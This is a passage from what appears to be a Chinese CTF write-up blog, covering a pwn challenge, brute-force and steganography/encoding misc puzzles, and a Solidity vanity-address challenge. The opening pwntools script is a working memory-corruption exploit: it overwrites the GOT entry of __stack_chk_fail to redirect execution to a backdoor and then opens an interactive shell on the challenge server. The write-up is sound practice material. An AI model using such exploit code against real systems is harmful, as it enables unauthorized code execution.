ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>

backdoor <span class="token operator">=</span> <span class="token number">0x4011D0</span>
bss <span class="token operator">=</span> <span class="token number">0x404000</span>

__stack_check_fail_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span>

<span class="token comment"># payload = p64(backdoor) * 12 + b'a' * (0x48) + p64(__stack_check_fail_got)</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">12</span> <span class="token operator">+</span>  <span class="token punctuation">(</span>p64<span class="token punctuation">(</span>__stack_check_fail_got<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>

<span class="token comment"># g(p)</span>
sla<span class="token punctuation">(</span><span class="token string">"What do you want to say?\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>


p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="GeekChallege"><a href="#GeekChallege" class="headerlink" title="GeekChallege"></a>GeekChallege</h2><p>和强网杯那个fuzz一样，爆破就好了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">0</span>
IP <span class="token operator">=</span> <span class="token string">"yuanshen.life"</span>
PORT <span class="token operator">=</span> <span class="token number">33591</span>

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>

tempfile <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'0'</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">114</span>
charset <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">check_success</span><span class="token punctuation">(</span>tempfile<span class="token punctuation">,</span> old_coverage<span class="token punctuation">)</span><span class="token punctuation">:</span>
    temp_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>tempfile<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> temp_str<span class="token punctuation">)</span>
    new_coverage <span class="token operator">=</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    
    <span class="token keyword">if</span> old_coverage <span class="token operator">!=</span> new_coverage<span class="token punctuation">:</span>
        old_coverage <span class="token operator">=</span> new_coverage
        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token punctuation">,</span> new_coverage
    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> old_coverage

sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>tempfile<span class="token punctuation">)</span><span class="token punctuation">)</span>
coverage <span class="token operator">=</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

passwd <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
        tempfile<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> j
        success<span class="token punctuation">,</span> coverage <span class="token operator">=</span> check_success<span class="token punctuation">(</span>tempfile<span class="token punctuation">,</span> coverage<span class="token punctuation">)</span>
        <span class="token keyword">if</span> success<span class="token punctuation">:</span>
            passwd<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        tempfile<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0'</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>coverage<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="WHO-WHO-WHO"><a href="#WHO-WHO-WHO" class="headerlink" title="WHO?WHO?WHO"></a>WHO?WHO?WHO</h2><p>搜索了一下是零宽隐写，用这个在线的网站就能解出来了</p>
<p><a target="_blank" rel="noopener" href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a> </p>
<p>然后解出来是一个base64的编码，开头是openssl相关的特征，把openssl相关的所有decode都试了一遍，最后在rabbit decode那成功解出来了 key是shumu</p>
<pre class="line-numbers language-none"><code class="language-none">U2FsdGVkX19uvldJ6CGUNff3B28QEdIjZqgUh98K+&#x2F;0J16ELU8WVQydohw4P5+2M
jbhTLQHNOpcoOd7kSRgy8pwpovCmimdD8M0IbYUeXjNKYePL&#x2F;WP4PCMaOJHAW3HR
b7IEoDDH1NYh3o5NwMmcFEqy1ujf72VgQIQkaeYFFFE&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>搜了一下这个叫dna编码，密文和明文是一个映射关系</p>
<pre class="line-numbers language-none"><code class="language-none">GTAGAGCTAGTCCTT&#123;GGGTCACGGTTC_GGGTCACGGTTC_GAACGGTTC_GTAGTG_GCTTCA_GTAGACGTGGCGGTG_GTAGACTCA_TATGACCGG_GCTCGGGCT&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://github.com/omemishra/DNA-Genetic-Python-Scripts-CTF">https://github.com/omemishra/DNA-Genetic-Python-Scripts-CTF</a> </p>
<p>用这里的脚本改一下就能解出来了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">mapping <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'AAA'</span><span class="token punctuation">:</span> <span class="token string">'a'</span><span class="token punctuation">,</span>
    <span class="token string">'AAC'</span><span class="token punctuation">:</span> <span class="token string">'b'</span><span class="token punctuation">,</span>
    <span class="token string">'AAG'</span><span class="token punctuation">:</span> <span class="token string">'c'</span><span class="token punctuation">,</span>
    <span class="token string">'AAT'</span><span class="token punctuation">:</span> <span class="token string">'d'</span><span class="token punctuation">,</span>
    <span class="token string">'ACA'</span><span class="token punctuation">:</span> <span class="token string">'e'</span><span class="token punctuation">,</span>
    <span class="token string">'ACC'</span><span class="token punctuation">:</span> <span class="token string">'f'</span><span class="token punctuation">,</span>
    <span class="token string">'ACG'</span><span class="token punctuation">:</span> <span class="token string">'g'</span><span class="token punctuation">,</span>
    <span class="token string">'ACT'</span><span class="token punctuation">:</span> <span class="token string">'h'</span><span class="token punctuation">,</span>
    <span class="token string">'AGA'</span><span class="token punctuation">:</span> <span class="token string">'i'</span><span class="token punctuation">,</span>
    <span class="token string">'AGC'</span><span class="token punctuation">:</span> <span class="token string">'j'</span><span class="token punctuation">,</span>
    <span class="token string">'AGG'</span><span class="token punctuation">:</span> <span class="token string">'k'</span><span class="token punctuation">,</span>
    <span class="token string">'AGT'</span><span class="token punctuation">:</span> <span class="token string">'l'</span><span class="token punctuation">,</span>
    <span class="token string">'ATA'</span><span class="token punctuation">:</span> <span class="token string">'m'</span><span class="token punctuation">,</span>
    <span class="token string">'ATC'</span><span class="token punctuation">:</span> <span class="token string">'n'</span><span class="token punctuation">,</span>
    <span class="token string">'ATG'</span><span class="token punctuation">:</span> <span class="token string">'o'</span><span class="token punctuation">,</span>
    <span class="token string">'ATT'</span><span class="token punctuation">:</span> <span class="token string">'p'</span><span class="token punctuation">,</span>
    <span class="token string">'CAA'</span><span class="token punctuation">:</span> <span class="token string">'q'</span><span class="token punctuation">,</span>
    <span class="token string">'CAC'</span><span class="token punctuation">:</span> <span class="token string">'r'</span><span class="token punctuation">,</span>
    <span class="token string">'CAG'</span><span class="token punctuation">:</span> <span class="token string">'s'</span><span class="token punctuation">,</span>
    <span class="token string">'CAT'</span><span class="token punctuation">:</span> <span class="token string">'t'</span><span class="token punctuation">,</span>
    <span class="token string">'CCA'</span><span class="token punctuation">:</span> <span class="token string">'u'</span><span class="token punctuation">,</span>
    <span class="token string">'CCC'</span><span class="token punctuation">:</span> <span class="token string">'v'</span><span class="token punctuation">,</span>
    <span class="token string">'CCG'</span><span class="token punctuation">:</span> <span class="token string">'w'</span><span class="token punctuation">,</span>
    <span class="token string">'CCT'</span><span class="token punctuation">:</span> <span class="token string">'x'</span><span class="token punctuation">,</span>
    <span class="token string">'CGA'</span><span class="token punctuation">:</span> <span class="token string">'y'</span><span class="token punctuation">,</span>
    <span class="token string">'CGC'</span><span class="token punctuation">:</span> <span class="token string">'z'</span><span class="token punctuation">,</span>
    <span class="token string">'CGG'</span><span class="token punctuation">:</span> <span class="token string">'A'</span><span class="token punctuation">,</span>
    <span class="token string">'CGT'</span><span class="token punctuation">:</span> <span class="token string">'B'</span><span class="token punctuation">,</span>
    <span class="token string">'CTA'</span><span class="token punctuation">:</span> <span class="token string">'C'</span><span class="token punctuation">,</span>
    <span class="token string">'CTC'</span><span class="token punctuation">:</span> <span class="token string">'D'</span><span class="token punctuation">,</span>
    <span class="token string">'CTG'</span><span class="token punctuation">:</span> <span class="token string">'E'</span><span class="token punctuation">,</span>
    <span class="token string">'CTT'</span><span class="token punctuation">:</span> <span class="token string">'F'</span><span class="token punctuation">,</span>
    <span class="token string">'GAA'</span><span class="token punctuation">:</span> <span class="token string">'G'</span><span class="token punctuation">,</span>
    <span class="token string">'GAC'</span><span class="token punctuation">:</span> <span class="token string">'H'</span><span class="token punctuation">,</span>
    <span class="token string">'GAG'</span><span class="token punctuation">:</span> <span class="token string">'I'</span><span class="token punctuation">,</span>
    <span class="token string">'GAT'</span><span class="token punctuation">:</span> <span class="token string">'J'</span><span class="token punctuation">,</span>
    <span class="token string">'GCA'</span><span class="token punctuation">:</span> <span class="token string">'K'</span><span class="token punctuation">,</span>
    <span class="token string">'GCC'</span><span class="token punctuation">:</span> <span class="token string">'L'</span><span class="token punctuation">,</span>
    <span class="token string">'GCG'</span><span class="token punctuation">:</span> <span class="token string">'M'</span><span class="token punctuation">,</span>
    <span class="token string">'GCT'</span><span class="token punctuation">:</span> <span class="token string">'N'</span><span class="token punctuation">,</span>
    <span class="token string">'GGA'</span><span class="token punctuation">:</span> <span class="token string">'O'</span><span class="token punctuation">,</span>
    <span class="token string">'GGC'</span><span class="token punctuation">:</span> <span class="token string">'P'</span><span class="token punctuation">,</span>
    <span class="token string">'GGG'</span><span class="token punctuation">:</span> <span class="token string">'Q'</span><span class="token punctuation">,</span>
    <span class="token string">'GGT'</span><span class="token punctuation">:</span> <span class="token string">'R'</span><span class="token punctuation">,</span>
    <span class="token string">'GTA'</span><span class="token punctuation">:</span> <span class="token string">'S'</span><span class="token punctuation">,</span>
    <span class="token string">'GTC'</span><span class="token punctuation">:</span> <span class="token string">'T'</span><span class="token punctuation">,</span>
    <span class="token string">'GTG'</span><span class="token punctuation">:</span> <span class="token string">'U'</span><span class="token punctuation">,</span>
    <span class="token string">'GTT'</span><span class="token punctuation">:</span> <span class="token string">'V'</span><span class="token punctuation">,</span>
    <span class="token string">'TAA'</span><span class="token punctuation">:</span> <span class="token string">'W'</span><span class="token punctuation">,</span>
    <span class="token string">'TAC'</span><span class="token punctuation">:</span> <span class="token string">'X'</span><span class="token punctuation">,</span>
    <span class="token string">'TAG'</span><span class="token punctuation">:</span> <span class="token string">'Y'</span><span class="token punctuation">,</span>
    <span class="token string">'TAT'</span><span class="token punctuation">:</span> <span class="token string">'Z'</span><span class="token punctuation">,</span>
    <span class="token string">'TCA'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span>
    <span class="token string">'TCC'</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token punctuation">,</span>
    <span class="token string">'TCG'</span><span class="token punctuation">:</span> <span class="token string">'3'</span><span class="token punctuation">,</span>
    <span class="token string">'TCT'</span><span class="token punctuation">:</span> <span class="token string">'4'</span><span class="token punctuation">,</span>
    <span class="token string">'TGA'</span><span class="token punctuation">:</span> <span class="token string">'5'</span><span class="token punctuation">,</span>
    <span class="token string">'TGC'</span><span class="token punctuation">:</span> <span class="token string">'6'</span><span class="token punctuation">,</span>
    <span class="token string">'TGG'</span><span class="token punctuation">:</span> <span class="token string">'7'</span><span class="token punctuation">,</span>
    <span class="token string">'TGT'</span><span class="token punctuation">:</span> <span class="token string">'8'</span><span class="token punctuation">,</span>
    <span class="token string">'TTA'</span><span class="token punctuation">:</span> <span class="token string">'9'</span><span class="token punctuation">,</span>
    <span class="token string">'TTC'</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span>
    <span class="token string">'TTG'</span><span class="token punctuation">:</span> <span class="token string">' '</span><span class="token punctuation">,</span>
    <span class="token string">'TTT'</span><span class="token punctuation">:</span> <span class="token string">'.'</span>
<span class="token punctuation">&#125;</span>

decode_string <span class="token operator">=</span> <span class="token string">'GTAGAGCTAGTCCTT&#123;GGGTCACGGTTC_GGGTCACGGTTC_GAACGGTTC_GTAGTG_GCTTCA_GTAGACGTGGCGGTG_GTAGACTCA_TATGACCGG_GCTCGGGCT&#125;'</span>

<span class="token keyword">def</span> <span class="token function">decode_dna</span><span class="token punctuation">(</span>decode_string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    i <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>decode_string<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> decode_string<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token string">"&#123;&#125;_"</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> decode_string<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'&#123;'</span><span class="token punctuation">:</span>
                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;'</span><span class="token punctuation">)</span>
            <span class="token keyword">elif</span> decode_string<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>
                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span>
            <span class="token keyword">elif</span> decode_string<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'_'</span><span class="token punctuation">:</span>
                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">)</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            piece <span class="token operator">=</span> decode_string<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span>
            <span class="token keyword">if</span> piece <span class="token keyword">in</span> mapping<span class="token punctuation">:</span>
                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>mapping<span class="token punctuation">[</span>piece<span class="token punctuation">]</span><span class="token punctuation">)</span>
                i <span class="token operator">+=</span> <span class="token number">3</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                i <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>

decoded_string <span class="token operator">=</span> decode_dna<span class="token punctuation">(</span>decode_string<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>decoded_string<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="blockchain"><a href="#blockchain" class="headerlink" title="blockchain"></a>blockchain</h1><h2 id="CheckinNewYear"><a href="#CheckinNewYear" class="headerlink" title="CheckinNewYear"></a>CheckinNewYear</h2><p>这个RPC节点是操作私有链的入口，然后水龙头是一个获取货币的接口，要在谷歌浏览器装个metaMask的虚拟钱包插件，通过设置metaMask的网络使用rpc节点访问私有链，来和题目交互</p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/blockchain/introduction/">https://ctf-wiki.org/blockchain/introduction/</a></p>
<p>ctfwiki这里有一些区块链相关的名词解释，区块链其实类似于一个分布式的数据库，然后智能合约是部署在链上的程序，如果更新链的状态(添加数据 往链上部署智能合约 调用智能合约程序)就会产生一笔交易，这个交易是要收取费用的，所以要通过水龙头获取足够多的货币再和题目进行交互。要开启挑战的话，首先要往一个指定的账户发货币，然后他会给一个地址，这个地址上有题目相关的程序，可以用Remix ide编译题目的代码，然后再 at address中填入题目给的合约地址，这样就能交互了</p>
<pre class="line-numbers language-none"><code class="language-none">题目源码请通过nc获取
题目地址 （nc 连接）124.221.86.119 40001
RPC 节点(http) 124.221.86.119 40002
水龙头 124.221.86.119 40003<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">Can you make the isSolved() function return true?

[1] - Create an account which will be used to deploy the challenge contract
[2] - Deploy the challenge contract using your generated account
[3] - Get your flag once you meet the requirement
[4] - Show the contract source code
[-] input your choice:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>题目的代码是这样的，要设置 NewYear为Happy 然后再调用 isSolved，这样再菜单中选择choice 3就能得到flag了，然后只有通过require(uint160(msg.sender) |<br>        2<strong>16 * 3</strong>3 * 5 * 7 * 13 * 17 * 19 * 37 * 73 * 97 * 109 * 241 * 257 * 433 * 577 * 673 * 38737 * 487824887233 &#x3D;&#x3D;<br>        2**2 * 17 * 67 * 733 * 316139 * 18992431891 * 72887484710091183279372959<br>        ,”Not this Year”); 这个cmp才能设置，这个cmp其实是在判断 发起交易的人账户地址 低位是不是 0x2024，如果不是那就走不到下边</p>
<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: shu shao de xiao mi di</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.9</span><span class="token punctuation">;</span>
<span class="token keyword">contract</span> <span class="token class-name">HappyNewYear</span><span class="token punctuation">&#123;</span>
    <span class="token builtin">string</span> <span class="token keyword">private</span> NewYear<span class="token punctuation">;</span>
    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _newyear <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>
        NewYear <span class="token operator">=</span> _newyear<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function">happyNewYear</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _newYear<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint160</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token operator">|</span>
        <span class="token number">2</span><span class="token operator">**</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token operator">**</span><span class="token number">3</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">*</span> <span class="token number">7</span> <span class="token operator">*</span> <span class="token number">13</span> <span class="token operator">*</span> <span class="token number">17</span> <span class="token operator">*</span> <span class="token number">19</span> <span class="token operator">*</span> <span class="token number">37</span> <span class="token operator">*</span> <span class="token number">73</span> <span class="token operator">*</span> <span class="token number">97</span> <span class="token operator">*</span> <span class="token number">109</span> <span class="token operator">*</span> <span class="token number">241</span> <span class="token operator">*</span> <span class="token number">257</span> <span class="token operator">*</span> <span class="token number">433</span> <span class="token operator">*</span> <span class="token number">577</span> <span class="token operator">*</span> <span class="token number">673</span> <span class="token operator">*</span> <span class="token number">38737</span> <span class="token operator">*</span> <span class="token number">487824887233</span> <span class="token operator">==</span>
        <span class="token number">2</span><span class="token operator">**</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token number">17</span> <span class="token operator">*</span> <span class="token number">67</span> <span class="token operator">*</span> <span class="token number">733</span> <span class="token operator">*</span> <span class="token number">316139</span> <span class="token operator">*</span> <span class="token number">18992431891</span> <span class="token operator">*</span> <span class="token number">72887484710091183279372959</span>
        <span class="token punctuation">,</span><span class="token string">"Not this Year"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        NewYear <span class="token operator">=</span> _newYear<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

       <span class="token keyword">function</span> <span class="token function">isSolved</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>NewYear<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token string">"Happy"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"not HappyNewYear"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://vanity-eth.tk/">https://vanity-eth.tk/</a></p>
<p>后面发现有这样一个网站，是可以生成一个自定义低位或者高位的账户，通过这个网站生成一个低位是0x2024的账户，就能过这个cmp了</p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="battle-city"><a href="#battle-city" class="headerlink" title="battle-city"></a>battle-city</h2><p>直接打通关的</p>

	  <div class="article-footer-copyright">
	Ciallo～(∠・ω< )⌒★
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
